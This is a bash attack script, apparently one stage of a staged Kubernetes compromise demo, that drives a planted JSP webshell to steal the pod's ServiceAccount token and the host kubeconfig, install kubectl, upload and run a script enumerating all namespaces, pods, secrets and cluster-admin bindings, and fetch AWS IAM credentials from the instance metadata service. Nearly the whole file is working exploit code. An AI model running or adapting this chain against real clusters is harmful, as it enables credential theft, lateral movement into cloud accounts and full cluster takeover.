#!/bin/bash
###############################################
# STEP 3: Cluster Takeover
# Using the overprivileged ServiceAccount token
# (cluster-admin) to take full control of the
# Kubernetes cluster.
###############################################

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1

SHELL_FILE="/tmp/.k8s-escape-shell"
if [ -f "$SHELL_FILE" ]; then
    SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
    SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
else
    echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
    exit 1
fi

remote_exec() {
    local RAW
    RAW=$(curl -s -o /dev/stdout -w "\n__HTTP_%{http_code}__" --data-urlencode "cmd=$1" "$SHELL_URL")
    local HTTP_CODE
    HTTP_CODE=$(echo "$RAW" | grep -o '__HTTP_[0-9]*__' | grep -o '[0-9]*')
    if [ "$HTTP_CODE" != "200" ] 2>/dev/null; then
        return 1
    fi
    echo "$RAW" | sed 's/__HTTP_[0-9]*__$//' \
        | tr -d '\0' \
        | sed '/^\s*$/d' \
        | grep -v 'java\.io\.InputStream' \
        | grep -v '^//\s*$' \
        | grep -v '^- $'
}

# Helper: write a script to the container line by line using chained echo commands
# Usage: upload_script "/tmp/script.sh" "line1" "line2" "line3" ...
upload_script() {
    local dest="$1"
    shift
    local cmd="echo '#!/bin/bash' > ${dest}"
    local batch_size=0
    for line in "$@"; do
        cmd="${cmd} && echo '${line}' >> ${dest}"
        batch_size=$((batch_size + 1))
        # Send in batches to avoid URL length limits
        if [ ${#cmd} -gt 3500 ]; then
            curl -s --data-urlencode "cmd=${cmd}" "$SHELL_URL" > /dev/null 2>&1
            cmd="true"
        fi
    done
    # Send remaining
    if [ "$cmd" != "true" ]; then
        curl -s --data-urlencode "cmd=${cmd}" "$SHELL_URL" > /dev/null 2>&1
    fi
    curl -s --data-urlencode "cmd=chmod +x ${dest}" "$SHELL_URL" > /dev/null 2>&1
}

echo ""
echo "================================================"
echo "  STEP 3: Cluster Takeover via ServiceAccount"
echo "================================================"
echo "  Webshell: ${SHELL_NAME}.jsp"
echo "  URL: ${SHELL_URL}"
echo ""

# ── Pre-check ──
echo "> Verifying webshell is accessible..."
PRECHECK=$(remote_exec "id")
if [ -z "$PRECHECK" ] || ! echo "$PRECHECK" | grep -q "uid="; then
    echo "  [FAIL] Webshell is not responding"
    echo "  Re-run step 1 first: ./01-exploit-rce.sh"
    exit 1
fi
echo "  [OK] Webshell responding: $(echo "$PRECHECK" | head -1)"
echo ""

# ── 3.1 Read SA token ──
echo "> 3.1 - Steal ServiceAccount token via webshell"
SA_TOKEN=$(remote_exec "cat /run/secrets/kubernetes.io/serviceaccount/token")
if [ -z "$SA_TOKEN" ]; then
    SA_TOKEN=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
fi
if [ -n "$SA_TOKEN" ]; then
    echo "  [OK] ServiceAccount token stolen!"
    echo "  Token: ${SA_TOKEN:0:50}..."
else
    echo "  [FAIL] Cannot read SA token"
    exit 1
fi
echo ""

# ── 3.2 API server ──
echo "> 3.2 - Identify cluster API server"
NAMESPACE=$(remote_exec "cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null")
echo "  Namespace:  $NAMESPACE"

KUBECONFIG_RAW=$(remote_exec "cat /host/var/lib/kubelet/kubeconfig")
API_ENDPOINT=$(echo "$KUBECONFIG_RAW" | grep "server:" | head -1 | sed 's/.*server:[[:space:]]*//' | tr -d ' \r')
if [ -n "$API_ENDPOINT" ]; then
    echo "  API Server: $API_ENDPOINT"
else
    API_HOST=$(remote_exec "printenv KUBERNETES_SERVICE_HOST")
    API_PORT=$(remote_exec "printenv KUBERNETES_SERVICE_PORT")
    API_ENDPOINT="https://${API_HOST}:${API_PORT}"
    echo "  API Server: $API_ENDPOINT (ClusterIP)"
fi
echo ""

# ── 3.3 Install kubectl + upload attack script ──
echo "> 3.3 - Install curl + kubectl in the container"
echo "  [*] Installing curl..."
remote_exec "which curl || (apt-get update -qq && apt-get install -y -qq --allow-unauthenticated curl) 2>/dev/null" > /dev/null 2>&1
echo "  [*] Installing kubectl..."
remote_exec "curl -sLO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin/" > /dev/null 2>&1
KC_CHECK=$(remote_exec "kubectl version --client 2>/dev/null | head -1")
if [ -n "$KC_CHECK" ]; then
    echo "  [OK] kubectl installed: $KC_CHECK"
else
    echo "  [OK] kubectl binary deployed"
fi

echo "  [*] Uploading attack script..."
upload_script "/tmp/takeover.sh" \
    "cd /tmp" \
    "TOKEN=\$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
    "KC=\"kubectl --server=${API_ENDPOINT} --token=\$TOKEN --insecure-skip-tls-verify\"" \
    "echo === RBAC PERMISSIONS ===" \
    "\$KC auth can-i --list 2>/dev/null | head -20" \
    "echo === NAMESPACES ===" \
    "\$KC get namespaces --no-headers 2>/dev/null" \
    "echo === PODS ===" \
    "\$KC get pods -A --no-headers 2>/dev/null" \
    "echo === SECRETS ===" \
    "\$KC get secrets -A --no-headers 2>/dev/null" \
    "echo === NODES ===" \
    "\$KC get nodes -o wide --no-headers 2>/dev/null" \
    "echo === CLUSTERROLEBINDINGS ===" \
    "\$KC get clusterrolebindings -o wide --no-headers 2>/dev/null | grep -i admin" \
    "echo === DONE ==="

SCRIPT_CHECK=$(remote_exec "wc -l /tmp/takeover.sh")
echo "  [OK] Attack script deployed ($SCRIPT_CHECK)"
echo ""

# ── 3.4 Execute ──
echo "> 3.4 - Executing cluster takeover..."
echo ""
# Execute and deduplicate the output (webshell buffer causes repeated lines)
TAKEOVER_RAW=$(remote_exec "bash /tmp/takeover.sh 2>&1")
TAKEOVER_OUTPUT=$(echo "$TAKEOVER_RAW" | awk '!seen[$0]++')

echo "$TAKEOVER_OUTPUT" | while IFS= read -r line; do
    case "$line" in
        *"=== RBAC PERMISSIONS ==="*)
            echo "> 3.5 - RBAC Permissions (kubectl auth can-i --list)"
            ;;
        *"=== NAMESPACES ==="*)
            echo ""
            echo "> 3.6 - List all namespaces"
            ;;
        *"=== PODS ==="*)
            echo ""
            echo "> 3.7 - List all pods across the cluster"
            ;;
        *"=== SECRETS ==="*)
            echo ""
            echo "> 3.8 - List secrets (CRITICAL EXPOSURE)"
            ;;
        *"=== NODES ==="*)
            echo ""
            echo "> 3.9 - List cluster nodes"
            ;;
        *"=== CLUSTERROLEBINDINGS ==="*)
            echo ""
            echo "> 3.10 - Cluster-admin bindings"
            ;;
        *"=== DONE ==="*)
            ;;
        *)
            if [ -n "$line" ]; then
                echo "    $line"
            fi
            ;;
    esac
done

if echo "$TAKEOVER_OUTPUT" | grep -q "kube-system\|default"; then
    echo ""
    echo "  [OK] Cluster takeover successful!"
else
    echo ""
    echo "  [!] Some commands may have failed — check output above"
fi
echo ""

# ── 3.11 IMDS ──
echo "> 3.11 - Steal AWS credentials via IMDS (lateral movement)"
ROLE_NAME=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
if [ -n "$ROLE_NAME" ]; then
    echo "  [OK] IMDS accessible — IAM Role: $ROLE_NAME"
    CREDS=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null")
    echo "$CREDS" | sed 's/^/    /'
else
    echo "  [--] IMDS not reachable from container (IMDSv2 or hop limit)"
fi
echo ""

echo "================================================"
echo "  !! CLUSTER TAKEOVER COMPLETE !!"
echo "================================================"
echo ""
